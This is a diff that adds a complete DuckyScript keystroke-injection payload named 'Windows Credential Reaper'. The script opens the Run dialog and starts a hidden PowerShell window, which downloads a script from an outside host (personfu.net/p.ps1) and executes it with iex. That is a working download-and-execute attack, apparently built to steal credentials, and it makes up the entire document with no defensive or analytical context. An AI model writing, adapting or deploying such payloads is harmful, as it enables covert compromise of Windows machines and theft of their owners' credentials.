@@ -1,0 +1,6 @@
+REM Windows Credential Reaper
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w h -c "IWR http://personfu.net/p.ps1 | iex"
+ENTER
